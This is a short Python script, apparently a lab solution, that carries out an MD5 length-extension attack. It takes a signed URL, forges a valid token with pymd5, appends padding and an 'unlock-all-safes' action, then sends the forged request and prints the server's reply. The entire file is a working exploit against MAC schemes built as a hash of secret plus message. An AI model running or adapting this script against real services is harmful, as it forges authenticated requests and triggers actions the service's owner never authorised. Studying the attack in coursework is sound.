import sys
import requests
from codecs import decode
from pymd5 import md5, padding
from urllib.parse import quote


def parse_url(url):
    url_split = url.split("?")
    url_endpoint = url_split[0]
    url_params = url_split[1]
    size = len(url_params[url_params.find("u"):])
    url_vars = dict()
    for var in url_params.split("&"):
        var = var.split("=")
        url_vars[var[0]] = var[1]
    return [url_endpoint,url_vars,size]

def len_extend(hash, size):
    size += 8
    bits = (size + len(padding(size * 8))) * 8
    h = md5(state=decode(hash, "hex"), count = bits)
    extension = "&action2=unlock-all-safes&customer="
    h.update(extension)
    return h.hexdigest()
    
def build_new_url(endpoint, params, token,size):
    url = endpoint + "?"
    size += 8
    for key in params.keys():
        if key == "token":
            url += "token=" + token
            continue
        url += "&" + key + "=" + params[key]
    return url + quote(padding(size * 8)) + "&action2=unlock-all-safes&customer="
    
def main():
    url = sys.argv[1]
    endpoint, url_params, size = parse_url(url)
    new_token = len_extend(url_params["token"],size)
    attack_url = build_new_url(endpoint, url_params,new_token,size)
    print(attack_url)
    response = requests.get(attack_url)
    print(response.text)

if __name__ == "__main__":
	main()